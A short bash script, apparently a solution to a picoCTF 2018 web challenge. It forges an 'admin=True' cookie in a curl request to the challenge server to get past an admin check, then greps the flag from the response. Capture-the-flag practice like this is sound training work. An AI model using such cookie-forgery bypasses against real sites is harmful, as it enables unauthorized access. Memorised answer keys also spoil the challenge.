#!/bin/bash

# web page with 'Flag' button
# but "I'm sorry it doesn't look like you are the admin." when submit
# maybe add classic cookie admin=True when submitting ?
curl -s --cookie 'admin=True' http://2018shell.picoctf.com:10573/flag | grep -oE 'picoCTF{.*}' 
